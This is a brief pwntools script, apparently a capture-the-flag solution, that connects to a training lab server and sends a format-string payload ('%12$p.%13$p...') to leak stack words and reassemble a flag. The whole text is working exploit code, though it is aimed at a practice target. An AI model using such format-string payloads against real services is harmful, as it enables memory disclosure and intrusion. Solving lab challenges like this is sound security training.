from pwn import *

r = remote('lab.scist.org', 13371)

r.sendline(b'%12$p.%13$p.%14$p.%15$p')

flag = b''.join(p64(int(n, 16)) for n in r.recvline().strip().split(b'.'))
print(flag)

r.interactive()